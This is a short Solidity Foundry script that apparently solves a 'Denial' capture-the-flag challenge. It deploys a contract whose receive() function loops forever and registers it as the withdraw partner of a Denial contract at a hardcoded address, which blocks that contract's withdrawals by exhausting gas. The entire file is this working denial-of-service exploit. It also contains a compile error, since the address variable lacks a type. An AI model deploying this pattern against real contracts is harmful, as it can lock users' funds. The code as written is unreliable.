// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import {Denial} from "../src/Denial.sol";

contract CounterScript is Script {
    Hack hack;
     denialAddress = 0xF3986A5Fc7F3f8F06d77ae37db0cA95c9069FdC3;

    function setUp() public {}

    function run() public {
        vm.startBroadcast();

        hack = new Hack();

        Denial(denialAddress).setWithdrawPartner(address(hack));

        vm.stopBroadcast();
    }
}


contract Hack {
    receive() external payable {
        while(true){}
    }
}